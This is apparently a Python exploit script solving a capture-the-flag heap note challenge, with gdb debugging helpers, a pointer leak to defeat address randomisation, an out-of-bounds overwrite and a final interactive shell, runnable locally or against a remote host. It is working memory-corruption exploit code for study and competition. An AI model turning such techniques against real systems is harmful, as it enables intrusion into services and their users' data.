#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output, Popen
from time import sleep
import shlex
import os

context.update(
    log_level='debug',
    binary=ELF('./ctf', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)

exe = context.binary

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.QEMU:
        # env = {"GLIBC_TUNABLES": "glibc.mem.tagging=1"}
        if args.GDB:
            return process(["./qemu-aarch64", "-g", "5000", "-L", "./aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["./qemu-aarch64", "-L", "./aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path], aslr=False)

def debug():
    gdb_cmd = "gdb-multiarch"
    gdb_args = [
        f"-ex", "init-pwndbg",
        f"-ex", f"target remote:5000",
        f"-ex", f"set resolve-heap-via-heuristic force",
        f"-ex", "brva 0xF48",
        f"-ex", "brva 0x116C",
        f"-ex", "brva 0xF28",
        f"-ex", "brva 0x1094",
        f"-ex", "brva 0x113C",
        f"-ex", "b flag",
        f"-ex", "b handler",
        f"-ex", "c"
    ]

    full_cmd = " ".join([shlex.quote(arg) for arg in [gdb_cmd] + gdb_args])

    Popen([
        "wt.exe", "new-tab", "wsl.exe", "-d", "Ubuntu-22.04", "--",
        "bash", "-c", full_cmd
    ])


def one_gadget(filename, base_addr=0):
    return [(int(i) + base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]


def create(size: int):
    sla(b'Give me your command:\n', f'C {size}'.encode())


def read(idx: int):
    sla(b'Give me your command:\n', f'R {idx}'.encode())


def write(idx: int, offset: int, size: int, data: bytes):
    sla(b'Give me your command:\n', f" W {idx} {offset} {size}".encode() + data)


# ==================== EXPLOIT ====================
p = start()

# debug()
# sleep(1)

create(0x30)
in0 = p16(0x2a8)
write(0, 0x20, len(in0), in0)
# write(0, 0xf000000000010d0, len(in0), in0)

read(0)
ru(b'Note at 0: ')
leak = rl()[:-1]
exe.address = fixleak(leak) - exe.sym.flag
success('code base @ %#x', exe.address)

write(0, 0x10, len(leak), leak)
write(0, 0xa8, 8, b'A'*8)

read(0)

interactive()
